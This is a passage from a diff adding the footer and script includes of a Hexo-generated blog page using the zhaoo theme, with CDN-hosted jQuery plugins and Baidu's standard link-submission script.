+        href="https://github.com/59lx "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#24292E'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+    <div class="scrollbar j-scrollbar">
+  <div class="scrollbar-current j-scrollbar-current"></div>
+</div>
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+</body>
+
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
